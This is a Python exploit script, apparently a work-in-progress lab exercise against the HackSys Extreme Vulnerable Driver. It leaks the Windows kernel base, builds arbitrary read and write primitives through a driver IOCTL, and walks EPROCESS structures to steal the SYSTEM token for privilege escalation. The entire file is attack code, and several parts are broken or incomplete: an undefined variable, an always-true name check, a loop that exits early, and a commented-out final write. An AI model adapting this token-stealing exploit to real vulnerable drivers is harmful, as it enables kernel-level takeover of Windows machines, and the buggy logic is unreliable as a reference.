#!/usr/bin/python
# -*- coding: utf-8 -*-

import ctypes
import struct
import sys
import os
import time
import platform
from ctypes import *
from ctypes.wintypes import *

############################################ Windows Constants ##############################################

ntdll = windll.ntdll
kernel32 = windll.kernel32
gdi32 = windll.gdi32
user32 = windll.user32

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
NULL = 0
STATUS_SUCCESS = 0
MOVEFILE_REPLACE_EXISTING = 0x01
CREATE_SUSPENDED = 0x00000004
THREADFUNC = CFUNCTYPE(None)
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
PAGE_READWRITE = 0x00000004
ThreadBasicInformation = 0

################################################### ADDRESSES FOR MSDN ######################################################

USER_ADDR = 0x000000001a000000
WHAT_ADDR = 0x000000001a001000 # Arbitrary offset inside BASEADDRESS 
USER_MEM_PAGE_PTR = 0x000000001a000500 # Requires at least 16 byte offset in our defined user memory from limits.
CURRENT_PROCESS_HANDLE = 0xFFFFFFFFFFFFFFFF
BASEADDRESS = c_ulonglong(USER_ADDR)
ALLOCATED_USER_MEM_SZ = c_ulonglong(0x3000)

###################################################### DEFINITIONS ##########################################################

ntdll.NtAllocateVirtualMemory.argtypes = [
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    POINTER(c_ulonglong),
    c_ulonglong,
    c_ulonglong,
    ]

kernel32.WriteProcessMemory.argtypes = [c_ulonglong, c_ulonglong,
        c_char_p, c_ulonglong, POINTER(c_ulonglong)]

kernel32.DeviceIoControl.argtypes = [
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    c_void_p,
    c_ulong,
    POINTER(c_ulong),
    c_void_p,
    ]

kernel32.ReadProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p,
        c_size_t, POINTER(c_size_t)]

ntdll.NtQueryInformationThread.argtypes = [c_void_p, c_ulonglong,
        c_void_p, c_ulong, POINTER(c_ulonglong)]

STATUS_SUCCESS = 0
written = c_size_t()
read = c_size_t()

dwStatus = ntdll.NtAllocateVirtualMemory(
    CURRENT_PROCESS_HANDLE,
    byref(BASEADDRESS),
    0,
    byref(ALLOCATED_USER_MEM_SZ),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
    )

# If not zero (True), something didn't work.

if dwStatus != STATUS_SUCCESS:
    print ('Something went wrong while allocating memory', 'e')
    sys.exit()


########################################## KERNEL BASE ################################################

def getkernelBase(driver):
    print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
    sys_info = create_string_buffer(0)
    sys_info_len = c_ulong(0)

    ntdll.NtQuerySystemInformation(0xb, sys_info, len(sys_info),
                                   addressof(sys_info_len))

    sys_info = create_string_buffer(sys_info_len.value)

    result = ntdll.NtQuerySystemInformation(0xb, sys_info,
            len(sys_info), addressof(sys_info_len))

    if result == 0:
        print '[*] Success, allocated {}-byte result buffer'.format(str(len(sys_info)))
    else:

        print '[!] NtQuerySystemInformation failed with NTSTATUS: {}'.format(hex(result))

    class SYSTEM_MODULE_INFORMATION(Structure):

        _fields_ = [
            ('Reserved', c_void_p * 2),
            ('ImageBase', c_void_p),
            ('ImageSize', c_long),
            ('Flags', c_ulong),
            ('LoadOrderIndex', c_ushort),
            ('InitOrderIndex', c_ushort),
            ('LoadCount', c_ushort),
            ('ModuleNameOffset', c_ushort),
            ('ImageName', c_char * 256),
            ]

    handle_num = c_ulong(0)
    handle_num_str = create_string_buffer(sys_info.raw[:0x8])
    memmove(addressof(handle_num), handle_num_str, sizeof(handle_num))

    print '[*] Result buffer contains {} SystemModuleInformation objects'.format(str(handle_num.value))
    sys_info = create_string_buffer(sys_info.raw[0x8:])

    counter = 0
    for x in range(handle_num.value):
        tmp = SYSTEM_MODULE_INFORMATION()
        tmp_si = create_string_buffer(sys_info[counter:counter
                + sizeof(tmp)])
        memmove(addressof(tmp), tmp_si, sizeof(tmp))
        if 'ntoskrnl' or 'ntkrnl' in tmp.ImageName:
            img_name = tmp.ImageName.split('\\')[-0x01]
            print '[*] Kernel Type: {}'.format(img_name)
            kernel_base = hex(tmp.ImageBase)[:-0x01]
            print '[*] Kernel Base: {}'.format(kernel_base)
            
            return (img_name, long(kernel_base, 0))
    counter += sizeof(tmp)


########################################### CALCULATE OFFSETS FROM KERNEL #############################################

def get_PsISP_kernel_address(kernel_base, img_name):

    kernel32.LoadLibraryA.restype = c_uint64
    kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
    kernel32.GetProcAddress.restype = c_uint64

    # Load kernel image in userland and get PsInitialSystemProcess offset

    kernel_handle = kernel32.LoadLibraryA(img_name)
    print '[+] Loading %s in Userland' % img_name

    # print("[+] %s Userland Base Address : 0x%X" % (kernel_base, kernel_handle))

    PsISP_USER_ADDRess = kernel32.GetProcAddress(kernel_handle, 'PsInitialSystemProcess')
    print '[+] PsInitialSystemProcess Userland Base Address: 0x%X' % PsISP_USER_ADDRess

    # Calculate PsInitialSystemProcess offset in kernel land

    system_process_base_pointer = kernel_base + PsISP_USER_ADDRess - kernel_handle
    print '[+] PsInitialSystemProcess Kernel Base Address: 0x%X' % system_process_base_pointer

    PsISP_kernel_address = c_ulonglong()


    return long(system_process_base_pointer)


################################################### WRITE ###########################################################

def writeQWORD(driver, what=0x4141414141414141, USER_MEM_PAGE_PTR=0x4242424242424242):
    
    # Write the what value to WHAT_ADDR
    data = struct.pack("<Q", what)
    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, WHAT_ADDR, data, len(data), byref(written))
    
    if dwStatus == 0:
        print("Something went wrong while writing to memory","e")
        sys.exit()

    # Pack the address of the what value and the USER_MEM_PAGE_PTR address
    data = struct.pack("<Q", WHAT_ADDR) + struct.pack("<Q", USER_MEM_PAGE_PTR)
    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE, USER_ADDR, data, len(data), byref(written))
    if dwStatus == 0:
        print("Something went wrong while writing to memory in the packing section","e")
        sys.exit()
    

    #IOCTL
    IoControlCode = 0x0022200B
    #USER_MEM_PAGE_PTR
    InputBuffer = c_void_p(USER_ADDR)
    # I THINK this should work? 
    InputBufferLength = 0x10 # can't take length of a void pointer len(InputBuffer) 
    # If our buffer length is zero can't we set OutputBuffer to None?
    OutputBuffer = c_void_p(0x0)
    # The OutputBufferLength is already set to zero. I think we can get rid of this?
    OutputBufferLength = 0x0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)

    print "Value before DeviceIoControl: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
    triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
    print "Our memory target is: " + str(hex(WHAT_ADDR))
    print "I wrote this to our memory target: %08x" % cast(USER_MEM_PAGE_PTR, POINTER(c_ulonglong))[0]
    return triggerIOCTL

################################################### READ ###########################################################
                          # What is it you want to read? #We are writing it back to userland memory.

def readPrimitive(driver, WHAT_ADDR, USER_MEM_PAGE_PTR):

    # We've created a block of memory at the top of userland via dwStatus

    IoControlCode = 0x0022200B
    InputBuffer = c_void_p(1)
    InputBufferLength = 0x10
    OutputBuffer = c_void_p(0)
    OutputBufferLength = 0
    dwBytesReturned = c_ulong()
    lpBytesReturned = byref(dwBytesReturned)

                                                            # THIS SHOULD BE USER_ADDR, OUR USER MEMORY PAGE
    
    #print "WHAT: ", type(WHAT_ADDR), hex(WHAT_ADDR)
    #print "USER_MEM_PAGE_PTR: ", type(USER_MEM_PAGE_PTR), hex(USER_MEM_PAGE_PTR)

    data = struct.pack('<QQ', WHAT_ADDR, USER_MEM_PAGE_PTR)
    dwStatus = kernel32.WriteProcessMemory(CURRENT_PROCESS_HANDLE,
            USER_ADDR, data, len(data), byref(written))

    #print 'Value before DeviceIoControl: %08x' % cast(USER_ADDR, POINTER(c_ulonglong))[0]

    triggerIOCTL = kernel32.DeviceIoControl(
        driver,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        lpBytesReturned,
        NULL,
        )

    #print 'Value after: %08x' % cast(USER_ADDR, POINTER(c_ulonglong))[0]
 
    process_struct_ptr = cast(USER_ADDR, POINTER(c_ulonglong))[0]
    #print type(process_struct_ptr)
    #print ("process_struct_ptr is: " + hex(process_struct_ptr))

    #return (triggerIOCTL, process_struct_ptr)
    return process_struct_ptr

############################## GET CURRENT PROCESS TOKEN OFFSET ################################

def get_current_eprocess(system_process_base_pointer, driver):
    """ Returns ptr to Current EPROCESS structure """
    PID_OFFSET = 0x2e0
    PROC_FLINK_OFFSET = 0x2e8
    TOKEN_OFFSET = 0x358

    flink = readPrimitive(driver, system_process_base_pointer + PROC_FLINK_OFFSET, USER_ADDR)
    print hex(flink)
    #stop = flink
    currentprocessBase = 0

        #unique_process_id = c_ulonglong(0)

        # Adjust EPROCESS pointer for next entry

        #print("Flink.value {}".format(flink.value))
        #system_process_base_pointer = flink.value - PID_OFFSET - 0x8
    system_process_base_pointer = flink - PID_OFFSET - 0x8

    print "System Process Base Pointer", type(system_process_base_pointer), hex(system_process_base_pointer)
        # Get PID

    #unique_process_id = readPrimitive(driver, system_process_base_pointer + PID_OFFSET, USER_ADDR)
    print "Process ID: ", unique_process_id

    print c_ulonglong(unique_process_id).value
        # Check if we're in the current process

        #if os.getpid() == unique_process_id:
            #print "Our Process ID is: ", os.getpid()
            #currentprocessBase = system_process_base_pointer
            #break

    flink = readPrimitive(driver, system_process_base_pointer + PROC_FLINK_OFFSET, USER_ADDR)

    print "Flink ", hex(flink)
        
        # If next same as last, we've reached the end

        #base_pointer = flink.value - PID_OFFSET - 0x8
    base_pointer = flink - PID_OFFSET - 0x8
    #if base_pointer == system_process_base_pointer:
            #break

    return long(currentprocessBase)

####################################### GET DRIVER HANDLE ######################################
def getDriver():
        # This is a fixed address in our userland memory page.

    driver = kernel32.CreateFileA(
        '\\\\.\\HackSysExtremeVulnerableDriver',
        GENERIC_READ | GENERIC_WRITE,
        0,
        None,
        3,
        0,
        None,
        )
    if not driver or driver == -0x01:
        print '[!] Driver handle not found :(\n'
        sys.exit()
    else:
        print '[X] Got handle to the driver.\n'

        return driver
        
########################################### MAIN ###############################################

def executeOverwrite():

        print "MAIN Getting Driver!"
        driver = getDriver()
        
        # Get kernel base.

        print "MAIN Got Driver, getting Kernel Base!"
        (img_name, kernel_base) = getkernelBase(driver)

        # Get system process base.

        print "MAIN Got Kernel Base, Getting System Process Base!"
        system_process_base_pointer = get_PsISP_kernel_address(kernel_base, img_name)

        # Read the value of that token.

        print "MAIN Got System Process Base, Getting System Token!"
        #triggerIOCTL, process_struct_ptr = readPrimitive(driver, system_process_base_pointer, USER_ADDR)

        process_struct_ptr = readPrimitive(driver, system_process_base_pointer, USER_ADDR)

        
        # Define our expected offsets for this version of Windows.


        PROC_FLINK_OFFSET = 0x2e8
        TOKEN_OFFSET = 0x358

        print "MAIN We know the proper offsets now."
        system_token = system_process_base_pointer + TOKEN_OFFSET

        process_base_pointer = system_process_base_pointer

        counter = 0

        while True:

            if counter > 0:
                break
            counter+=1

            next_proc_struct = readPrimitive(driver, process_base_pointer + PROC_FLINK_OFFSET, USER_ADDR)
            if next_proc_struct == system_process_base_pointer:
                break
     
            process_base_pointer = next_proc_struct

            print "Process Base Pointer", type(process_base_pointer), hex(process_base_pointer)

            current_token = process_base_pointer + TOKEN_OFFSET

            print type(process_struct_ptr)
            #whatStr = str(hex(process_struct_ptr))
            #print "This is what in string format: " + whatStr
            #what = int((whatStr), 0) #figure out the base for me - throws a fit if its base 10
            what = process_struct_ptr #figure out the base for me - throws a fit if its base 10
            writeQWORD(driver, what, USER_MEM_PAGE_PTR)
            # Write the system_token over our current_token for SYSTEM privileges.
            print "MAIN Attempting system to current token overwrite!"

            #success = writePrimitive(driver, system_token, current_token, system_token)

        #print "MAIN Success!"
############################################ RUN ################################################

executeOverwrite()

